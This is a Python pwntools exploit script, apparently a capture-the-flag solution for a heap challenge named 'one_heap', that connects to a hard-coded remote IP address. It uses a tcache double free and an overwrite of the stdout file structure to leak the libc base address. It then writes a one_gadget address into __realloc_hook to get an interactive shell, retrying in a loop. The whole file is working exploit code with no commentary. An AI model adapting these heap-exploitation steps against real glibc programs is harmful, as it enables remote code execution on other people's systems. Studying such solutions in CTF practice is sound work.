from pwn import *
context.arch = "amd64"
context.aslr = False
libc = ELF("./libc-2.27.so")

def add(size,data,shift = False):
    io.sendlineafter("choice:",str(1))
    io.sendlineafter("size",str(size))
    if(shift == False):
        io.sendlineafter("content:",data)
    else:
        io.sendafter("content:",data)
def rm():
    io.sendlineafter("choice:",str(2))
while(True):
    try:
        #io = process("./one_heap",env = {"LD_PRELOAD":"./libc-2.27.so"})
        io = remote("47.104.89.129","10001")
        add(0x60,'0000')
        rm()
        rm()
        add(0x60,'\x20\x60')
        add(0x60,' ')
        add(0x60,'\x60\x77')
        add(0x60,p64(0xfbad1880)+p64(0)*3+"\x58")
        lbase = u64(io.recv(8))-libc.sym['_IO_file_jumps']
        success("LBASE -> %#x"%lbase)
        add(0x40,'0000')
        rm()
        rm()
        add(0x40,p64(lbase+libc.sym['__realloc_hook']))
        add(0x40,p64(lbase+libc.sym['__realloc_hook']))
        one = 0x4f2c5
        add(0x40,p64(lbase+one)+p64(lbase+libc.sym['realloc']+0xe))
        '''
        io.sendlineafter("choice:",str(1))
        io.sendlineafter("size",str(size))
        '''
        #gdb.attach(io,'handle SIGALRM nostop noprint')
        io.interactive()
        raw_input()
    except Exception, e:
        io.close()
